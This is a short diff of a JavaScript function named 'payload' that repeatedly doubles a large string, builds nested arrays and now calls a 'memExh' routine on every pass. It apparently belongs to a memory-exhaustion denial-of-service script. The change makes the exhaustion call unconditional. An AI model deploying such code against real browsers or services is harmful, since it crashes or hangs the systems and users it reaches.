@@ -74,9 +74,9 @@ function payload() {
         largeString += largeString;
         if (largeString.length > 100000000) { // Lower threshold for reset
             largeString = "B".repeat(900000); // Reset string to avoid overflow
-            memExh();
+            //memExh();
         }
-
+memExh();
         // Nested arrays
         nestedArray.push([]);
         if (nestedArray.length > 500) { // Reduced nesting
